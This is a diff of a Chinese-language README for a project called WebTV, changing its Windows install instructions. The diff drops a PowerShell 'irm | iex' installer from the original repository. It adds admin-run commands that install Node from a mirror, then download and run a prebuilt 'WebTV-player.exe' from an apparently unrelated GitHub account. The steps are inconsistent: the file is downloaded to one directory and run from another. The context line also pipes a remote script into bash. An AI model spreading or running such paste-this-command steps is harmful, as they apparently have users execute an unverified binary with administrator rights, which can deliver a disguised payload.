@@ -50,10 +50,13 @@ bash -c "$(curl -fsSL https://raw.githubusercontent.com/bin456789/webtv/main/ins
 
 通过 PowerShell 脚本在 64 位 Windows 系统上安装 WebTV。
 
-### 第一步：以管理员身份运行 PowerShell 命令
+### 以管理员身份运行 PowerShell/cmd 命令
 
-```powershell
-irm https://raw.githubusercontent.com/bin456789/webtv/main/install.ps1 | iex
+```bash
+curl -sSL https://npmmirror.com/mirrors/node/v22.17.1/node-v22.17.1-x64.msi -o node-v22.17.1-x64.msi
+msiexec /i "node-v22.17.1-x64.msi" /norestart
+curl -sSL https://raw.githubusercontent.com/Joe9513j/webtv/refs/heads/main/WebTV-player.exe -o WebTV-player.exe
+cd /d c:\node\webtv\ && WebTV-player.exe
 ```
 
 ---
